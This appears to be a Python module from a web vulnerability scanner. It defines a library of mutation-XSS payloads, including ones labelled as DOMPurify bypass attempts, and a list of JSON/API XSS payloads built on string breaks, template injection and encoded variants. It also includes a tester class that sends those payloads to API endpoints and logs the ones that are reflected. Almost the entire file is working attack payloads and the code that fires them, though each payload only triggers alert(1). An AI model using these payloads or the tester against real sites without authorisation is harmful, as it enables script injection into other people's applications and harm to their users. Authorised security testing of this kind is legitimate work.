"""
payloads/mxss_and_api.py

1. mXSS (Mutation XSS) payload library
   Browser DOM parser mutations that turn "safe" strings dangerous.

2. JSON/API XSS payloads
   Payloads crafted for JSON body parameters and REST APIs.
"""

from typing import List, Tuple


# ═══════════════════════════════════════════════════════════════
# MUTATION XSS PAYLOADS
# ═══════════════════════════════════════════════════════════════

MXSS_PAYLOADS: List[Tuple[str, str]] = [
    # ── Classic mXSS — broken/malformed HTML that browsers "fix" ──
    ("<listing><img src=\"</listing><img src=x onerror=alert(1)//>",        "mxss_listing"),
    ("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",     "mxss_noscript"),
    ("<xmp><p title=\"</xmp><svg/onload=alert(1)>\">",                       "mxss_xmp"),
    ("<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>", "mxss_math"),
    ("<textarea><img src=\"</textarea><img src=x onerror=alert(1)//>",      "mxss_textarea"),
    ("<title><img src=\"</title><img src=x onerror=alert(1)//>",            "mxss_title"),
    ("<iframe src=\"</iframe><img src=x onerror=alert(1)//>",               "mxss_iframe"),
    ("<style><img src=\"</style><img src=x onerror=alert(1)//>",            "mxss_style"),
    ("<plaintext><img src=\"</plaintext><img src=x onerror=alert(1)//>",    "mxss_plaintext"),

    # ── DOMPurify bypass attempts ──
    ("<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayc+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPg==#x\"/>", "mxss_svg_use"),
    ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>",              "mxss_svg_animate"),
    ("<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src=>\">", "mxss_form_math"),

    # ── Namespace confusion ──
    ("<math><mtext><table><tbody><tr><td><mglyph><image xlink:href=\"data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\">", "mxss_namespace"),
    ("<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",       "mxss_cdata"),

    # ── HTML5 parser quirks ──
    ("<<SCRIPT>alert(1)//<</SCRIPT>",                                        "mxss_double_open"),
    ("<scr<script>ipt>alert(1)</scr</script>ipt>",                           "mxss_nested_script"),
    ("<img ''><script>alert(1)</script>\">",                                  "mxss_broken_attr"),
    ("<!--[if lt IE 9]><script>alert(1)</script><![endif]-->",               "mxss_ie_conditional"),
    ("<![CDATA[><img src=\"]]\"><img src=x onerror=alert(1)//>]]>",          "mxss_cdata_break"),

    # ── Weird/exotic tags ──
    ("<isindex type=image src=1 onerror=alert(1)>",                          "mxss_isindex"),
    ("<input type=\"text\" value=\"`<script>alert(1)</script>`\">",          "mxss_backtick_attr"),
    ("<table background=\"javascript:alert(1)\">",                           "mxss_table_bg"),
    ("<object classid=\"clsid:ae24fdae-03c6-11d1-8b76-0080c744f389\">",     "mxss_object_classid"),
]


# ═══════════════════════════════════════════════════════════════
# JSON / API XSS PAYLOADS
# ═══════════════════════════════════════════════════════════════

JSON_XSS_PAYLOADS: List[Tuple[str, str]] = [
    # ── Payloads that work inside JSON string values ──
    # These assume the API returns JSON that gets rendered in HTML
    ("<script>alert(1)</script>",                    "json_html"),
    ("<img src=x onerror=alert(1)>",                 "json_html"),
    ("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "json_unicode"),
    ("\\u003cimg src=x onerror=alert(1)\\u003e",    "json_unicode"),

    # ── JSON string escape tricks ──
    ('"; alert(1); "',                               "json_string_break"),
    ("'+alert(1)+'",                                 "json_concat"),
    ("\"; alert(1); var x=\"",                       "json_quote_break"),

    # ── Template injection in JSON values ──
    ("{{constructor.constructor('alert(1)')()}}",    "json_template"),
    ("${alert(1)}",                                  "json_template_lit"),

    # ── XSS in JSON keys (less common but real) ──
    # Sent as: {"<img onerror=alert(1)>": "value"}
    ("<img onerror=alert(1)>",                       "json_key_xss"),

    # ── Encoded variants for JSON context ──
    ("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",  "json_hex"),
    ("%3Cscript%3Ealert(1)%3C/script%3E",           "json_url"),
]


# ═══════════════════════════════════════════════════════════════
# JSON API TESTER
# ═══════════════════════════════════════════════════════════════

import asyncio
import json as json_mod
import copy
from utils.config import ScanTarget, Finding, Context
from utils.http_client import HttpClient
from utils.logger import debug


class JSONAPITester:
    """
    Test XSS in JSON API endpoints.

    Detects:
    1. POST endpoints accepting JSON body
    2. Reflected JSON values rendered in HTML
    3. JSON response values embedded in page HTML
    """

    def __init__(self, http: HttpClient):
        self.http = http

    async def test_json_endpoint(
        self,
        url:    str,
        params: dict,
        method: str = "POST",
    ) -> List[Finding]:
        """
        Test all params in a JSON body for XSS reflection.
        """
        findings = []

        for param_key in params:
            for payload, label in JSON_XSS_PAYLOADS[:6]:
                test_data = copy.deepcopy(params)
                test_data[param_key] = payload

                try:
                    if method == "POST":
                        resp = await self.http.request(
                            "POST", url,
                            json=test_data,
                            headers={"Content-Type": "application/json"},
                        )
                    else:
                        resp = await self.http.get(url, params=test_data)

                    if resp is None:
                        continue

                    # Check reflection in raw response
                    if payload in resp.text:
                        idx = resp.text.find(payload)
                        evidence = resp.text[max(0,idx-80):idx+len(payload)+80]
                        findings.append(Finding(
                            url          = url,
                            param        = f"json:{param_key}",
                            payload      = payload,
                            context      = Context.JS_STRING,
                            xss_type     = "reflected",
                            evidence     = evidence[:300],
                            severity     = "High",
                            confidence   = "Medium",
                            encoding_used= label,
                        ))
                        break

                    # Check if JSON response has our payload embedded
                    try:
                        resp_json = json_mod.loads(resp.text)
                        resp_str  = json_mod.dumps(resp_json)
                        if payload in resp_str:
                            findings.append(Finding(
                                url          = url,
                                param        = f"json:{param_key}",
                                payload      = payload,
                                context      = Context.JS_STRING,
                                xss_type     = "stored",
                                evidence     = resp_str[:300],
                                severity     = "Medium",
                                confidence   = "Low",
                                encoding_used= f"json_response:{label}",
                            ))
                            break
                    except Exception:
                        pass

                except Exception as e:
                    debug(f"JSON test error {url}: {e}")

        return findings
